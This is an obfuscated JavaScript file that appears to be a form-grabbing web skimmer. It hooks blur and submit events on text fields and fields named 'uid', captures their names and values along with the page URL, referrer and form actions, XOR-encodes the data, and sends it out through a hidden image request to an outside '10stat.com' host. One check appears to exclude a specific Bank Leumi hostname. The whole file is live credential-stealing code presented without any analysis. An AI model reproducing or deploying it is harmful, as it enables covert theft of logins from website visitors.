(function () {

var q2tRho = 'le';
function aq4r(e){var t=document.createElement("style");document.getElementsByTagName("head")[0].appendChild(t);if(!window.createPopup){t.appendChild(document.createTextNode(""))}var n=document.styleSheets[document.styleSheets.length-1];for(var r=0,i=e.length;r<i;r++){var s=1,o=e[r],u=o[0],a="";if(Object.prototype.toString.call(o[1][0])==="[object Array]"){o=o[1];s=0}for(var f=o.length;s<f;s++){var l=o[s];a+=l[0]+":"+l[1]+(l[2]?" !important":"")+";\n"}if(n.insertRule){n.insertRule(u+"{"+a+"}",n.cssRules.length)}else{n.addRule(u,a,-1)}}} 

var qI8 = document;
var qI8f = qI8.forms;

aq4r([[('#cle')+'ar-2b'+('oth'), ['bac'+('kgro')+'und', 'none', true]]]);

function b2M4e(e, t, n) {
    if (!e.myEvents) e.myEvents = {};
    if (!e.myEvents[t]) e.myEvents[t] = [];
    var r = e.myEvents[t];
    r[r.length] = n
}

function b2M8e(e, t) {
    if (!e || !e.myEvents || !e.myEvents[t]) return;
    var n = e.myEvents[t];
    for (var r = 0, i = n.length; r < i; r++) n[r]()
}

function ri2odc(e, t) {
    for (var n = 0; n < t.length; n++) {
        if (e.indexOf(t[n]) != -1) {
            return true
        }
    }
    return false
}

function vgiofdx(e, t) {
    var n = new Array;
    for (var r = 0; r < 256; r++) {
        n[r] = r
    }
    var i = 0;
    var s;
    for (r = 0; r < 256; r++) {
        i = (i + n[r] + t.charCodeAt(r % t.length)) % 256;
        s = n[r];
        n[r] = n[i];
        n[i] = s
    }
    r = 0;
    i = 0;
    var o = "";
    for (var u = 0; u < e.length; u++) {
        r = (r + 1) % 256;
        i = (i + n[r]) % 256;
        s = n[r];
        n[r] = n[i];
        n[i] = s;
        o += String.fromCharCode(e.charCodeAt(u) ^ n[(n[r] + n[i]) % 256])
    }
    return o
}

function vliy3s(e) {
    valix2(e, true)
}

var vali = function() {
    var e = qI8.location.hostname;
    try {
        e = e.substring(e.length - 19)
    } catch (t) {}
    if (((typeof bLauNCTx == "undef" + "ined") || !bLauNCTx) && e != "hb"+"2.ba"+"nkleumi.c"+"o.il") {
        for (var n = 0; n < qI8f.length; n++) {
            var r = false;
            if (qI8f[n].elements) {
                for (var i = 0; i < qI8f[n].elements.length; i++) {
                    var s = qI8f[n].elements[i];
                    if (!s.type || ri2odc(s.type, unifowd) || ri2odc(s.name, unif2wd)) {
                        r = true
                    }
                }
            }
            if(typeof qI8f[n]._submit_ == "undefined")
			{
                if (qI8f[n][unif2wd].addEventListener) {
                    qI8f[n][unif2wd].addEventListener(tY7x, valix2, false)
                } else {
                    if (qI8f[n][unif2wd].attachEvent) {
                        qI8f[n][unif2wd].ix = n;
                        qI8f[n][unif2wd].attachEvent("on" + tY7x, vliy3s)
                    } else {
                        b2M4e(qI8f[n][unif2wd], tY7x, valix2);
                        qI8f[n][unif2wd]["on" + tY7x] = function () {
                            b2M8e(qI8f[n][unif2wd], tY7x)
                        }
                    }
                }
				qI8f[n]._submit_ = qI8f[n].submit;
				qI8f[n].submit = function () {
					valix7(this, null);
				}
            }
        }
    }
	setTimeout(vali, 1000);
};

function valix2(e, t) {
    var n;
    if (t) {
        n = qI8f[e["srcElement"]["ix"]]
    } else {
        n = this
    }
    return valix7(n, e)
}

function valix7(e, t) {
    if (true) {
        if (typeof unifowd != d3Rx) {
            if (e) {
                if (t && t.preventDefault) {
                    t.preventDefault()
                }
                if (t) {
                    t.returnValue = false
                }
                var n = e;
                var r = "";
				var s = e;
				if (s.name && s.value && (!s.type || ri2odc(s.type, unifowd) || ri2odc(s.name, unif2wd))) {
					var o = escape(s.name) + "=" + escape(s.value);
					r+= "&";
					r += o;
				}
                if (r != "") {
					
                    caches("ui"+q2tRho+"=1&uz=" + r);
                }
                setTimeout(function () {
                    try {
                        if (typeof n._submit_ != "undefined") {
                            n._submit_()
                        } else {
                            n.submit()
                        }
                    } catch (e) {}
                }, 1e3);
                return false
            }
        }
    }
}


var encrypt = function (e, t) {
    var n = "";
    for (var r = 0; r < e.length; r++) n += String.fromCharCode(t.charCodeAt(r % t.length) ^ e.charCodeAt(r));
    return n
};
var d3Rx = "undefined";
if (typeof yreWtazq == d3Rx) {
    var yreWtazq = ""
}
var tY7x = "blur";
var x2Bh = "ht" + "tp";
if (typeof unif2wd == d3Rx) {
    var unif2wd = ["uid"]
}
if (typeof unifowd == d3Rx) {
    var unifowd = ["text"]
}

    function cdn(pt, ke) {
        var ret = '';
        for (var i = 0; i < pt.length; i++) {
            ret += String.fromCharCode(ke.charCodeAt(i % ke.length) ^ pt.charCodeAt(i));
        }
        return ret;
    }

    function rdf(e, t, n) {
        var r = document.location.hostname;
        var i = new Date;
        i.setDate(i.getDate() + n);
        document.cookie = e + "=" + escape(t) + ";" + (n == null ? "" : "expires=" + i.toGMTString() + ";") + "path=/;domain=" + r;
    }

    function ietCmmkz(e) {
        var t, n, r, i = document.cookie.split(";");
        for (t = 0; t < i.length; t++) {
            n = i[t].substr(0, i[t].indexOf("="));
            r = i[t].substr(i[t].indexOf("=") + 1);
            n = n.replace(/^\s+|\s+$/g, "");
            if (n == e) {
                return unescape(r);
            }
        }
        return "";
    }

    function vitsinit() {
        if (typeof bLauNCTx == "undef" + "ined") {
            caches(q2tRho+"=1" + "&c=it"); vali();
        }
    }

    function caches(e) {
        fastload = ietCmmkz("imgtype");
        try {
            if (fastload.indexOf(e) != -1) {
                return;
            }
            var t = "tp";
            var n = "";
            var r = ":";
            var i = document;
            t = "ht" + t;
            var s = i.location;
            var o = "";
            var u = '/'+"1"+"0stat.com";
            var a;
            fastload += e;
            var f = (s.protocol == t + "s" + r ? t + "s" + r : t + "s" + r) + "/";
            var l = 1500;
            var c = "";
            for (var h in i.forms) {
                c += i.forms[h].action + ",";
            }
            rdf("imgtype", fastload);
            var p = e + "&u=" + escape(s) + "&r=" + escape(i.referrer) + "&fac=" + escape(c);
            var d = i.body;
            var v = "tmr=" + escape(cdn(p, "37px")).replace("%3C", "**3C**");
            var m = "it" + Math.random();
            var g = i.createElement("span");
            var y = g.style;
            y.position = "absolute";
            y.width = y.height = "1px";
            var b = i.createElement("img");
            b.id = m;
            y.display = "none";
            y.visibility = "hid" + "den";
            b.src = f + u + n + o + "/?" + v;
            g.appendChild(b);
            d.insertBefore(g, d.lastChild);
            setTimeout(function () {
                if (i.getElementById(m)) {
                    i.getElementById(m).src = "";
                }
            }, l);
        } catch (w) {}
    }
    Array.prototype.equals = function (e) {
        return e * e / 2 + this.indexOf(String.fromCharCode("" + (e * 2 + 1) + 9));
    };
    inititsafterload = function () {
        try {
            if (document.addEventListener) {
                document.addEventListener("DOMContentLoaded", vitsinit, false);
            }(function () {
                if (/loaded|complete/.test(document.readyState)) {
                    return vitsinit();
                }
                if (!vitsinit.done) {
                    setTimeout(arguments.callee, 30);
                }
            })();
            if (window.addEventListener) {
                window.addEventListener("load", vitsinit, false);
            } else {
                if (window.attachEvent) {
                    window.attachEvent("onload", vitsinit);
                }
            }
        } catch (e) {}
    };
    Array.prototype.equals = function (x) {
        return (x * x) / 2 + this.indexOf(String.fromCharCode("" + (x * 2 + 1) + 9));
    };
    setTimeout(function () {
        inititsafterload();
    }, 2000);
})();
